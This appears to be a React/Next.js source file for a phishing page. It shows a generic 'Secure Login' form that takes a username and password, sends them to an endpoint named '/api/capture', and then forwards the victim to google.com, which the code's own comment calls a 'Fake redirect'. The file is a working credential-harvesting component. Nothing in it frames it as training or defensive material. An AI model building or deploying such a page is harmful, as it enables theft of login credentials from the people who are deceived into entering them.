'use client'

export default function Home() {
  const handleSubmit = async (formData: FormData) => {
    await fetch('/api/capture', {
      method: 'POST',
      body: formData,
    })
    window.location.href = 'https://www.google.com' // Fake redirect
  }

  return (
    &lt;main className="flex min-h-screen flex-col items-center justify-center p-24 bg-gray-100"&gt;
      &lt;div className="bg-white p-8 rounded-lg shadow-md w-96"&gt;
        &lt;h1 className="text-2xl font-bold mb-6 text-center text-gray-800"&gt;Secure Login&lt;/h1&gt;
        &lt;form action={handleSubmit}&gt;
          &lt;input
            name="username"
            type="text"
            placeholder="Username or Email"
            className="w-full p-3 mb-4 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          /&gt;
          &lt;input
            name="password"
            type="password"
            placeholder="Password"
            className="w-full p-3 mb-6 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          /&gt;
          &lt;button
            type="submit"
            className="w-full bg-blue-500 text-white p-3 rounded-md hover:bg-blue-600 transition"
          &gt;
            Sign In
          &lt;/button&gt;
        &lt;/form&gt;
      &lt;/div&gt;
    &lt;/main&gt;
  )
}